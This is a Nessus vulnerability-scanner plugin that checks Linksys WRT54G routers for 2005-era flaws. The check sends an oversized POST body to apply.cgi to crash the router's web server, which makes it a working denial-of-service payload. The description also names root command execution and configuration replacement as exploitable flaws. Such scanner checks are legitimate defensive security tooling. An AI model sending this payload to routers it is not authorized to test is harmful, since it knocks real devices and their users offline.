#
#  Josh Zlatin-Amishav <josh at ramat.cc>
#  GPLv2
#
# Changes by Tenable:
# - Revised plugin title, changed family (1/21/2009)


include("compat.inc");

if(description)
{
 script_id(20096);
 script_bugtraq_id(14822);
 script_cve_id("CVE-2005-2799", "CVE-2005-2912", "CVE-2005-2914", "CVE-2005-2915", "CVE-2005-2916");
 script_xref(name:"OSVDB", value:"19386");
 script_xref(name:"OSVDB", value:"19387");
 script_xref(name:"OSVDB", value:"19388");
 script_xref(name:"OSVDB", value:"19389");
 script_xref(name:"OSVDB", value:"19390");
 script_version("$Revision: 1.5 $");
 
 script_name(english:"Linksys Multiple Vulnerabilities (OF, DoS, more)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be a Linksys WRT54G Wireless Router. 

The firmware version installed on the remote host is prone to several
flaws,

- Execute arbitrary commands on the affected router with root privilages. 

- Download and replace the configuration of affected routers via a special
  POST request to the 'restore.cgi' or 'upgrade.cgi' scripts.

- Allow remote attackers to obtain encrypted configuration information and,
  if the key is known, modify the configuration.

- Degrade the performance of affected devices and cause the Web server 
  to become unresponsive, potentially denying service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=304&type=vulnerabilities" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=305&type=vulnerabilities" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=306&type=vulnerabilities" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=307&type=vulnerabilities" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=308&type=vulnerabilities" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to firmware version 4.20.7 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
 summary["english"] = "Checks for DOS in apply.cgi";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"Copyright (C) 2005-2009 Josh Zlatin-Amishav");
 family["english"] = "CISCO";
 
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0);
if ( http_is_dead(port:port) ) exit(0);

banner = get_http_banner(port:port);
if (banner && 'realm="WRT54G"' >< banner) {
  soc = http_open_socket(port);
  if (! soc) exit(0);

  set_kb_item(name:"Services/www/" + port + "/embedded", value:TRUE);

  len = 11000;	# 10058 should be enough
  req = string("POST ", "/apply.cgi", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
  send(socket:soc, data:req);
  http_close_socket(soc);

  sleep(1);

  if(http_is_dead(port: port))
  {
   security_hole(port);
   exit(0);
  }
} 
